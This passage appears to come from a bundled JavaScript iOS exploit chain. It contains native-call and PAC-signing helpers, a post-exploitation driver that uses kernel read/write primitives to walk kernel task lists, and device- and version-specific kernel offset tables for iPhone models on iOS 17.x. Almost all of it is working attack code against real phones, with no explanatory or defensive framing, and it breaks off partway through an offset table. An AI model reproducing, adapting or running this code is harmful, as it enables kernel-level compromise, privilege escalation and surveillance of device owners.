		this.callSymbol("memcpy", ptr, buffPtr, buff.byteLength);
	}
	static write32(ptr, value) {
		let buffWrite = new ArrayBuffer(4);
		const view = new DataView(buffWrite);
		view.setUint32(0, value, true);
		this.write(ptr, buffWrite);
	}

	static read(ptr, length) {
		let buffRes = new ArrayBuffer(length);
		let buffPtr = read64(read64(addrof(buffRes) + 0x10n) + 0x10n);
		this.callSymbol("memcpy", buffPtr, ptr, length);
		return buffRes;
	}

	static read8(ptr) {
		let buff = this.read(ptr, 1);
		const view = new DataView(buff);
		return view.getUint8(0);
	}

	static read16(ptr) {
		let buff = this.read(ptr, 2);
		const view = new DataView(buff);
		return view.getUint16(0, true);
	}

	static read32(ptr) {
		let buff = this.read(ptr, 4);
		const view = new DataView(buff);
		return view.getUint32(0, true);
	}

	static read64(ptr) {
		let buff = this.read(ptr, 8);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}

	static readPtr(ptr) {
		return this.read64(ptr);
	}

	static readString(ptr, len=1024) {
		let buff = this.read(ptr, len);
		return this.bytesToString(buff, false);
	}

	static write8(ptr, value) {
		let buffWrite = new ArrayBuffer(1);
		const view = new DataView(buffWrite);
		view.setUint8(0, value);
		this.write(ptr, buffWrite);
	}

	static write16(ptr, value) {
		let buffWrite = new ArrayBuffer(2);
		const view = new DataView(buffWrite);
		view.setUint16(0, value, true);
		this.write(ptr, buffWrite);
	}

	static write32(ptr, value) {
		let buffWrite = new ArrayBuffer(4);
		const view = new DataView(buffWrite);
		view.setUint32(0, value, true);
		this.write(ptr, buffWrite);
	}

	static write64(ptr, value) {
		let buffWrite = new ArrayBuffer(8);
		const view = new DataView(buffWrite);
		view.setBigUint64(0, value, true);
		this.write(ptr, buffWrite);
	}

	static writeString(ptr, str) {
		//const buff = this.stringToBytes(str, true);
		//this.write(ptr, buff);
		this.callSymbol("memcpy", ptr, str, str.length + 1);
	}

	static getCString(str) {
		return get_cstring(str);
	}

	static #prepareArg(arg) {
		if(!arg)
			arg = 0n;
		if(typeof(arg) === "string")
			return get_cstring(arg);
		return BigInt(arg);
	}

	static strip(address) {
		return address & 0x7fffffffffn;
	}

	static pacia(address, modifier) {
		address = Native.strip(address);
		//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
		let signedAddress = pacia(address, BigInt(modifier));
		//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
		return signedAddress;
	}

	static dlsym(name) {
		return Native.callSymbol("dlsym", RTLD_DEFAULT, name);
	}

	static callSymbol(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {
		let funcSymbol = null;
		if(name === "dlysm")
			funcSymbol = DLSYM;
		else
			funcSymbol = fcall(DLSYM,RTLD_DEFAULT,get_cstring(name));
		a0 = this.#prepareArg(a0);
		a1 = this.#prepareArg(a1);
		a2 = this.#prepareArg(a2);
		a3 = this.#prepareArg(a3);
		a4 = this.#prepareArg(a4);
		a5 = this.#prepareArg(a5);
		a6 = this.#prepareArg(a6);
		a7 = this.#prepareArg(a7);
		a8 = this.#prepareArg(a8);
		a9 = this.#prepareArg(a9);
		a10 = this.#prepareArg(a10);
		a11 = this.#prepareArg(a11);
		a12 = this.#prepareArg(a12);
		a13 = this.#prepareArg(a13);
		a14 = this.#prepareArg(a14);
		a15 = this.#prepareArg(a15);
		let chosen_fcall = null;
		if(typeof fcall_with_pacia !== 'undefined')
			chosen_fcall = fcall_with_pacia;
		else
			chosen_fcall = fcall;
		const ret64 = chosen_fcall(funcSymbol, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15);
		if (ret64 < 0xffffffffn && ret64 > -0xffffffffn)
			return Number(ret64);
		if (ret64 == 0xffffffffffffffffn)
			return -1;
		return ret64;
	}

	static callSymbolRetain(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {
		return Native.callSymbol(name,a0,a1,a2,a3,a4,a5,a6,a7,a8, a9, a10, a11, a12, a13, a14, a15);
	}

	static bytesToString(bytes, includeNullChar=true) {
		let bytes8 = new Uint8Array(bytes);
		let str = "";
		for (let i=0; i<bytes8.length; i++) {
			if (!includeNullChar && !bytes8[i])
				break;
			str += String.fromCharCode(bytes8[i]);
		}
		return str;
	}

	static stringToBytes(str, nullTerminated=false) {
		let buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));
		let s8 = new Uint8Array(buff);
		for (let i=0; i<str.length; i++)
			s8[i] = str.charCodeAt(i);
		if (nullTerminated)
			s8[str.length] = 0x0;
		return s8.buffer;
	}

	static #doNativeCall(func, name, x0, x1, x2, x3, x4, x5, x6, x7) {
		// Initialize argPtr to point to general purpose memory chunk
		this.#argPtr = this.#argMem;
		x0 = this.#toNative(x0);
		x1 = this.#toNative(x1);
		x2 = this.#toNative(x2);
		x3 = this.#toNative(x3);
		x4 = this.#toNative(x4);
		x5 = this.#toNative(x5);
		x6 = this.#toNative(x6);
		x7 = this.#toNative(x7);
		let ret = func(name, x0, x1, x2, x3, x4, x5, x6, x7);
		// Reset argPtr
		this.#argPtr = this.#argMem;
		return this.#fromNative(ret);
	}

	static #fromNative(value) {
		if (!(value instanceof ArrayBuffer))
			return value;
		const view = new DataView(value);
		return view.getBigInt64(0, true);
	}

	static #toNative(value) {
		// Strings need to be manually written to native memory
		if (typeof value === 'string') {
			let ptr = this.#argPtr;
			this.writeString(ptr, value);
			this.#argPtr += BigInt(value.length + 1);
			return this.#bigIntToArray(ptr);
		}
		else if (typeof value === 'bigint') {
			return this.#bigIntToArray(value);
		}
		else
			return value;
	}

	static #bigIntToArray(value) {
		let a = new Uint8Array(8);
		for (let i=0; i<8; i++) {
			a[i] = Number(value & 0xffn)
			value >>= 8n;
		}
		return a.buffer;
	}
	static gc() {
	}
}

// Register global Native class
globalThis.Native = Native;


/***/ }),

/***/ "./src/libs/Chain/OffsetsStruct.js":
/*!*****************************************!*\
  !*** ./src/libs/Chain/OffsetsStruct.js ***!
  \*****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ OffsetsStruct)
/* harmony export */ });
const OFFSET_KERNEL_BASE  = 0xfffffff007004000n
//const OFFSET_KERNEL_TASK  = 0x925770n // iOS 17.5.1 - iPhone 13/13 pro max
//const OFFSET_KERNEL_TASK 0x91d318 // iOS 17.4.1 - iPhone 13 pro max
const OFFSET_KERNEL_TASK = 0x0n
const OFFSET_TASK_MAP = 0x28n
const OFFSET_TASK_NEXT = 0x30n
const OFFSET_TASK_PREV = 0x38n
const OFFSET_TASK_THREADS = 0x58n
const OFFSET_TASK_IPC_SPACE = 0x300n
const OFFSET_TASK_PROC_RO = 0x3a0n
const OFFSET_TASK_PROC_SIZE = 0x740n // iOS 17.5.1
const OFFSET_TASK_EXC_GUARD = 0x5d4n

const OFFSET_IPC_SPACE_TABLE = 0x20n
const OFFSET_IPC_ENTRY_OBJECT =	0x0n
const OFFSET_IPC_OBJECT_KOBJECT = 0x48n
const OFFSET_IPC_PORT_IP_NSREQUEST = 0x58n
const OFFSET_IPC_PORT_IP_SORIGHTS = 0x84n

const OFFSET_PROC_PID = 0x60n
const OFFSET_PROC_P_COMM = 0x568n

const OFFSET_THREAD_OPTIONS = 0x70n
const OFFSET_THREAD_KSTACKPTR = 0xf0n
const OFFSET_THREAD_ROP_PID = 0x160n
const OFFSET_THREAD_JOP_PID = 0x168n
const OFFSET_THREAD_GUARD_EXC_CODE = 0x330n
const OFFSET_THREAD_TASK_THREADS = 0x370n
const OFFSET_THREAD_TRO = 0x380n
const OFFSET_THREAD_AST = 0x3a4n
const OFFSET_THREAD_MUTEX_DATA = 0x3b0n
const OFFSET_THREAD_CTID = 0x430n

const OFFSET_TRO_TASK = 0x20n

const OFFSET_VM_HDR_RBH_ROOT = 0x38n
const OFFSET_VM_RBE_LEFT = 0x0n
const OFFSET_VM_RBE_RIGHT = 0x8n

const OFFSET_VM_OBJECT_VOU_SIZE = 0x18n
const OFFSET_VM_OBJECT_REF_COUNT = 0x28n

const OFFSET_VM_NAMED_ENTRY_COPY = 0x10n
const OFFSET_VM_NAMED_ENTRY_NEXT = 0x20n

const OFFSET_MIG_LOCK = 0x0n;
const OFFSET_MIG_SBXMSG = 0x0n;
class OffsetsStruct
{
	constructor() {
		this.baseKernel = OFFSET_KERNEL_BASE;
		this.kernelTask = OFFSET_KERNEL_TASK;
		this.T1SZ_BOOT = 17n;

		this.mapTask = OFFSET_TASK_MAP;
		this.nextTask = OFFSET_TASK_NEXT;
		this.prevTask = OFFSET_TASK_PREV;
		this.threads = OFFSET_TASK_THREADS;
		this.ipcSpace = OFFSET_TASK_IPC_SPACE;
		this.procRO = OFFSET_TASK_PROC_RO;
		this.procSize = OFFSET_TASK_PROC_SIZE;
		this.excGuard = OFFSET_TASK_EXC_GUARD;

		this.spaceTable = OFFSET_IPC_SPACE_TABLE;
		this.entryObject = OFFSET_IPC_ENTRY_OBJECT;
		this.objectKObject = OFFSET_IPC_OBJECT_KOBJECT;
		this.ipNsRequest = OFFSET_IPC_PORT_IP_NSREQUEST;
		this.ipSorights = OFFSET_IPC_PORT_IP_SORIGHTS;

		this.pid = OFFSET_PROC_PID;
		this.pComm = OFFSET_PROC_P_COMM;

		this.options = OFFSET_THREAD_OPTIONS;
		this.kstackptr = OFFSET_THREAD_KSTACKPTR;
		this.ropPid = OFFSET_THREAD_ROP_PID;
		this.jopPid = OFFSET_THREAD_JOP_PID;
		this.guardExcCode = OFFSET_THREAD_GUARD_EXC_CODE;
		this.taskThreads = OFFSET_THREAD_TASK_THREADS;
		this.tro = OFFSET_THREAD_TRO;
		this.ast = OFFSET_THREAD_AST;
		this.mutexData = OFFSET_THREAD_MUTEX_DATA;
		this.ctid = OFFSET_THREAD_CTID;

		this.troTask = OFFSET_TRO_TASK;

		this.hdrRBHRoot = OFFSET_VM_HDR_RBH_ROOT;
		this.rbeLeft = OFFSET_VM_RBE_LEFT;
		this.rbeRight = OFFSET_VM_RBE_RIGHT;

		this.vouSize = OFFSET_VM_OBJECT_VOU_SIZE;
		this.refCount = OFFSET_VM_OBJECT_REF_COUNT;

		this.backingCopy = OFFSET_VM_NAMED_ENTRY_COPY;
		this.next = OFFSET_VM_NAMED_ENTRY_NEXT;
		this.migLock = OFFSET_MIG_LOCK;
		this.migSbxMsg = OFFSET_MIG_SBXMSG;
	}
}


/***/ }),

/***/ "./src/libs/Driver/Driver.js":
/*!***********************************!*\
  !*** ./src/libs/Driver/Driver.js ***!
  \***********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ DriverPostExpl)
/* harmony export */ });
/* harmony import */ var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./Offsets */ "./src/libs/Driver/Offsets.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");


const TAG = "DRIVER-POSTEXPL"

class DriverPostExpl
{
	#offsets;
	#kernelBase;

	constructor() {
		this.#offsets = _Offsets__WEBPACK_IMPORTED_MODULE_0__["default"].getByDeviceAndVersion();
	}

	runPE() {
		console.log(TAG, `runPE()`);
		if (!this.#offsets) {
			console.log(TAG, `Offsets were not obtained, aborting`);
			return false;
		}
		/*
		let baseKernel = startSandworm();
		if (baseKernel == -1)
			return false;
		*/
		this.#kernelBase = mpd_kernel_base();

		return true;
	}

	getPaciaGadget() {
		return mpd_pacia_gadget();
	}

	getKernelBase() {
		return this.#kernelBase;
	}

	getSelfTaskAddr() {
		console.log(TAG, `getSelfTaskAddr`);

		let selfTaskKaddr = 0;
		for (let i=0; i<5; i++)
		{
			selfTaskKaddr = this.#findSelfTaskKaddr(true);
			if (!selfTaskKaddr)
			{
				console.log(TAG, `Searching the other way around`);
				selfTaskKaddr = this.#findSelfTaskKaddr(false);
			}
			else
				break;
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep",20000);
		}
		return selfTaskKaddr;
	}

	#findSelfTaskKaddr(direction) {
		let kernelTaskAddr = this.#kernelBase + this.#offsets.kernelTask;
		console.log(TAG, `baseKernel: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(this.#kernelBase)}, kernelTask: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(kernelTaskAddr)}`);

		let kernelTaskVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		this.read(kernelTaskAddr, kernelTaskVal, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		kernelTaskVal = uread64(kernelTaskVal);
		//console.log(TAG,`kernelTaskval:${kernelTaskVal}`);
		kernelTaskVal = BigInt(kernelTaskVal);
		//console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);
		let ourPid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("getpid");
		console.log(TAG, `Our pid:${ourPid}`);
		let nextTask = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n;
		if (direction)
			this.read(kernelTaskVal + this.#offsets.nextTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		else
			this.read(kernelTaskVal + this.#offsets.prevTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		nextTask = uread64(nextTask);
		//console.log(TAG,`nextTask:${Utils.hex(nextTask)}`);

		while (nextTask != 0 && nextTask != kernelTaskVal) {
			let procROAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			this.read(nextTask + this.#offsets.procRO, procROAddr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
			procROAddr = uread64(procROAddr);
			//console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);
			let procVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			this.read(procROAddr, procVal, 8);
			procVal = BigInt(uread64(procVal));
			//console.log(TAG,`procVal:${Utils.hex(procVal)}`);
			if (procVal && this.strip(procVal) > 0xffffffd000000000n) {
				let pid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
				this.read(procVal + this.#offsets.pid, pid, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				let buffRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(pid, 4);
				let view = new DataView(buffRes);
				pid = view.getUint32(0,true);
				//console.log(TAG,`pid:${Utils.hex(pid)}`);
				if (pid == ourPid) {
					console.log(TAG, `Found our pid`);
					return nextTask;
				}
				let nextTaskLocation = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
				if (direction)
					this.read(nextTask + this.#offsets.nextTask, nextTaskLocation, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				else
					this.read(nextTask + this.#offsets.prevTask, nextTaskLocation, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				nextTask = uread64(nextTaskLocation);
			}
			else
				break;
		}
		return false;
	}

	read(srcAddr, dst, len) {
		srcAddr = this.strip(srcAddr);
		if (srcAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot read: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(srcAddr)}`);
			return false;
		}
		kread_length(srcAddr,dst, len);
		return true;
	}

	write(dst, src, len) {
		let dstAddr = this.strip(dst);
		if (dstAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot write:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(dstAddr)}`);
			return false;
		}
		kwrite_length(dst, src, len);
		return true;
	}

	writeZoneElement(dstAddr, src, len) {
		return kwrite_zone_element(dstAddr, src, len);
	}

	offsets() {
		return this.#offsets;
	}

	strip(val) {
		return xpac(val);
	}

	transferRW() {
		return {
			controlSocket: mpd_control_socket(),
			rwSocket: mpd_rw_socket()
		};
	}

	threadSpawn(scriptCFString, threadMem) {
		mpd_js_thread_spawn(scriptCFString, threadMem, true);
	}
}


/***/ }),

/***/ "./src/libs/Driver/Offsets.js":
/*!************************************!*\
  !*** ./src/libs/Driver/Offsets.js ***!
  \************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Offsets)
/* harmony export */ });
/* harmony import */ var libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/OffsetsStruct */ "./src/libs/Chain/OffsetsStruct.js");
/* harmony import */ var _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./OffsetsTable */ "./src/libs/Driver/OffsetsTable.js");


const TAG  = "OFFSETS"

class Offsets
{
	static getByDeviceAndVersion()
	{
		Native.callSymbol("uname", Native.mem);
		const sysname = Native.readString(Native.mem, 0x100);
		const nodename = Native.readString(Native.mem + 0x100n, 0x100);
		const release = Native.readString(Native.mem + 0x200n, 0x100);
		const version = Native.readString(Native.mem + 0x300n, 0x100);
		const machine = Native.readString(Native.mem + 0x400n, 0x100);
		console.log(TAG, `release: ${release} with machine: ${machine}`);

		const buildVer = this.getBuildVersion();
		console.log(TAG, "Build version: " + buildVer);

		let splittedVersion = release.split(".");
		let xnuMajor = splittedVersion[0];
		let xnuMinor = splittedVersion[1];

		let splittedMachine = machine.split(",");
		let deviceFamily = splittedMachine[0];
		let deviceModel = splittedMachine[1];

		console.log(TAG, "deviceFamily: " + deviceFamily);

		// Ugly hack to support 17.7, 17.7.1 and 17.7.2
		if (buildVer) {
			if (buildVer == "21H16")
				xnuMinor = 6.1;
			else if (buildVer == "21H216")
				xnuMinor = 6.2;
			else if (buildVer == "21H221")
				xnuMinor = 6.3;
		}
		// Get offsets per device family
		let deviceOffsets = _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__.offsets[deviceFamily];
		if (!deviceOffsets) {
			console.log(TAG, `Unsupported machine: ${machine}`);
			return null;
		}

		let familyOffsets = deviceOffsets["*"];
		let foundFamilyOffsets = this.#getOffsetsByVersion(familyOffsets, xnuMajor, xnuMinor);

		if (!foundFamilyOffsets)
			return null;

		// Adjustments per device model
		let modelOffsets = deviceOffsets[deviceModel];
		let foundModelOffsets = null;
		if (modelOffsets)
			foundModelOffsets = this.#getOffsetsByVersion(modelOffsets, xnuMajor, xnuMinor);

		// Merge family offsets and device offsets
		let foundOffsets = new libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__["default"]();
		Object.assign(foundOffsets, foundFamilyOffsets);
		if (foundModelOffsets)
			Object.assign(foundOffsets, foundModelOffsets);

		if (["iPhone15", "iPhone16", "iPhone17"].includes(deviceFamily))
			foundOffsets.T1SZ_BOOT = 17n;
		else
			foundOffsets.T1SZ_BOOT = 25n;

		console.log(TAG, "Offsets: " + JSON.stringify(foundOffsets, (_,v) => typeof v === 'bigint' ? "0x"+v.toString(16) : v, 2));

		return foundOffsets;
	}

	static #getOffsetsByVersion(offsets, xnuMajor, xnuMinor) {
		let xnuMajorOffsets = 0;
		for (let major in offsets) {
			if (xnuMajor < major)
				continue;
			if (xnuMajorOffsets < major)
				xnuMajorOffsets = major;
		}

		if (!xnuMajorOffsets) {
			console.log(TAG, "Unsupported XNU major: " + xnuMajor);
			return null;
		}

		//console.log(TAG, "Matching XNU major: " + xnuMajorOffsets);
		xnuMajorOffsets = offsets[xnuMajorOffsets];

		let foundOffsets = {};
		let xnuMinorOffsets = -1;
		const sortedMinors = Object.keys(xnuMajorOffsets).sort();
		for (let minor of sortedMinors) {
			//console.log(TAG, `minor: ${minor}, xnuMinor: ${xnuMinor}`);
			if (minor > xnuMinor)
				break;
			if (xnuMinorOffsets < minor) {
				xnuMinorOffsets = minor;
				Object.assign(foundOffsets, xnuMajorOffsets[minor]);
			}
		}

		//console.log(TAG, "Matching XNU minor: " + xnuMinorOffsets);

		return foundOffsets;
	}
	static getBuildVersion() {
		const CTL_KERN = 1;
		const KERN_OSVERSION = 65;

		const mib = new ArrayBuffer(4 * 2);
		const mibView = new DataView(mib);
		mibView.setInt32(0, CTL_KERN, true);
		mibView.setInt32(4, KERN_OSVERSION, true);

		const mibAddr = Native.mem;
		const resultAddr = Native.mem + 0x100n;
		const lengthAddr = Native.mem + 0x200n;

		Native.write(Native.mem, mib);

		let ret = Native.callSymbol("sysctl", mibAddr, 2, resultAddr, lengthAddr, null, 0);
		if (ret != 0) {
			console.log(TAG, "Unable to get iOS build version");
			return null;
		}

		const length = Native.read32(lengthAddr);
		const buildVer = Native.readString(resultAddr, length);
		return buildVer;
	}
}


/***/ }),

/***/ "./src/libs/Driver/OffsetsTable.js":
/*!*****************************************!*\
  !*** ./src/libs/Driver/OffsetsTable.js ***!
  \*****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   offsets: () => (/* binding */ offsets)
/* harmony export */ });
const offsets = {
	// iPhone XS
	// iPhone XS Max
	// iPhone XS Max Global
	// iPhone XR
	"iPhone11": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5bcn,
					kstackptr: 0xe8n,
					ropPid: 0x150n,
					jopPid: 0x158n,
					guardExcCode: 0x308n,
					taskThreads: 0x348n,
					tro: 0x358n,
					ast: 0x37cn,
					mutexData: 0x380n,
					ctid: 0x408n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x918210n,
					guardExcCode: 0x318n,
					taskThreads: 0x358n,
					tro: 0x368n,
					ast: 0x38cn,
					mutexData: 0x398n,
					ctid: 0x418n
				},
				4: {
					kernelTask: 0x91c638n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x320n,
					taskThreads: 0x360n,
					tro: 0x370n,
					ast: 0x394n,
					mutexData: 0x3a0n,
					ctid: 0x420n,
					procRO: 0x388n
				},
				5: {
					kernelTask: 0x920a90n
				},
				6: {
					kernelTask: 0x9209f0n
				},
				6.1: {
					kernelTask: 0x920a40n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f1548n,
					pComm: 0x56cn,
					procRO: 0x3a0n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5dcn,
					kstackptr: 0xf0n,
					ropPid: 0x158n,
					jopPid: 0x160n,
					guardExcCode: 0x320n,
					taskThreads: 0x370n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n
				},
				1: {
					kernelTask: 0x9f1560n,
					taskThreads: 0x368n,
					tro: 0x370n,
					ast: 0x394n,
					mutexData: 0x3a0n,
					ctid: 0x420n
				},
				2: {
					kernelTask: 0x9fd988n,
				},
				3: {
					kernelTask: 0x9f5988n
				},
				4: {
					kernelTask: 0xa62b50n,
					procRO: 0x3c0n,
					excGuard: 0x5fcn,
					taskThreads: 0x370n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n
				},
				5: {
					kernelTask: 0xa6ac38n
				},
				6: {
					kernelTask: 0xa6ad48n,
  					guardExcCode: 0x328n,
					taskThreads: 0x378n,
  					tro: 0x380n,
  					ast: 0x3a4n,
  					mutexData: 0x3b0n,
  					ctid: 0x430n,
  					migLock: 0x36971f0n,
  					migSbxMsg: 0x3697210n,
  					migKernelStackLR: 0x2f7c1a0n,
				}
			}
		},
		"8": {
			23: {
				4: {
					kernelTask: 0x8fc638n
				},
				5: {
					kernelTask: 0x900a90n
				},
				6: {
					kernelTask: 0x9009f0n
				},
				6.1: {
					kernelTask: 0x900a40n
				}
			},
			24: {
				0: {
					kernelTask: 0x9d1548n
				},
				1: {
					kernelTask: 0x9d1560n,
				},
				2: {
					kernelTask: 0x9d9988n
				},
				3: {
					kernelTask: 0x9d1988n
				},
				4: {
					kernelTask: 0xa42b50n
				},
				5: {
					kernelTask: 0xad6b78n,
					migLock: 0x38d74e8n,
					migSbxMsg: 0x38d7508n,
					migKernelStackLR: 0x31b19e4n
				},
				6: {
					kernelTask: 0xa4ad48n,
					migLock: 0x352e1f0n,
					migSbxMsg: 0x352e210n,
					migKernelStackLR: 0x2e5ba20n,
				}
			}
		}
	},

	// iPhone 11
	// iPhone 11 Pro
	// iPhone 11 Pro Max
	// iPhone SE 2
	"iPhone12": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5bcn,
					kstackptr: 0xf0n,
					ropPid: 0x158n,
					jopPid: 0x160n,
					guardExcCode: 0x328n,
					taskThreads: 0x368n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x96c178n,
				},
				4: {
					kernelTask: 0x970588n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					procRO: 0x388n
				},
				5: {
					kernelTask: 0x9749d8n
				},
				6: {
					kernelTask: 0x974938n
				},
				6.1: {
					kernelTask: 0x974988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa49488n,
					pComm: 0x56cn,
					procRO: 0x3a0n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5dcn,
					kstackptr: 0xf8n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				1: {
					kernelTask: 0xa494a0n,
					taskThreads: 0x378n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n
				},
				2: {
					kernelTask: 0xa518c8n
				},
				3: {
					kernelTask: 0xa498c8n
				},
				4: {
					kernelTask: 0xacea90n,
					procRO: 0x3c0n,
					excGuard: 0x5fcn,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				5: {
					kernelTask: 0xad6b78n
				},
				6: {
					kernelTask: 0xad6c88n,
  					guardExcCode: 0x338n,
					taskThreads: 0x388n,
  					tro: 0x390n,
  					ast: 0x3b4n,
  					mutexData: 0x3c0n,
  					ctid: 0x440n,
					migLock: 0x38e34e8n,
					migSbxMsg: 0x38e3508n,
					migKernelStackLR: 0x31ba7a0n,
				}
			}
		},
		"3": {
			23: {
				4: {
					kernelTask: 0x974588n
				},
				5: {
					kernelTask: 0x9789d8n
				},
				6: {
					kernelTask: 0x974938n
				},
				6.1: {
					kernelTask: 0x974988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa49488n
				},
				1: {
					kernelTask: 0xa4d4a0n
				},
				2: {
					kernelTask: 0xa558c8n
				},
				3: {
					kernelTask: 0xa4d8c8n
				},
				4: {
					kernelTask: 0xacea90n
				},
				5: {
					kernelTask: 0xad6b78n
				},
				6: {
					kernelTask: 0xad6c88n,
					migLock: 0x38e7468n,
					migSbxMsg: 0x38e7488n,
					migKernelStackLR: 0x31bf5a0n,
				}
			}
		},
		"5": {
			23: {
				4: {
					kernelTask: 0x974588n
				},
				5: {
					kernelTask: 0x9789d8n
				},
				6: {
					kernelTask: 0x974938n
				},
				6.1: {
					kernelTask: 0x974988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa49488n
				},
				1: {
					kernelTask: 0xa4d4a0n
				},
				2: {
					kernelTask: 0xa558c8n
				},
				3: {
					kernelTask: 0xa4d8c8n
				},
				4: {
					kernelTask: 0xacea90n
				},
				5: {
					kernelTask: 0xad6b78n
				},
				6: {
					kernelTask: 0xad6c88n,
					migLock: 0x38e7468n,
					migSbxMsg: 0x38e7488n,
					migKernelStackLR: 0x31bf5a0n,
				}
			}
		},
		"8": {
			23: {
				4: {
					kernelTask: 0x960588n
				},
				5: {
					kernelTask: 0x9649d8n
				},
				6: {
					kernelTask: 0x964938n
				},
				6.1: {
					kernelTask: 0x964988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa35488n
				},
				1: {
					kernelTask: 0xa354a0n
				},
				2: {
					kernelTask: 0xa3d8c8n
				},
				3: {
					kernelTask: 0xa358c8n
				},
				4: {
					kernelTask: 0xab6a90n
				},
				5: {
					kernelTask: 0xabeb78n
				},
				6: {
					kernelTask: 0xac2c88n,
					migLock: 0x387a8e8n,
					migSbxMsg: 0x387a908n,
					migKernelStackLR: 0x3156f20n,
				}
			}
		}
	},

	// iPhone 12
	// iPhone 12 Mini
	// iPhone 12 Pro
	// iPhone 12 Pro Max
	"iPhone13": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5bcn,
					kstackptr: 0xf0n,
					ropPid: 0x158n,
					jopPid: 0x160n,
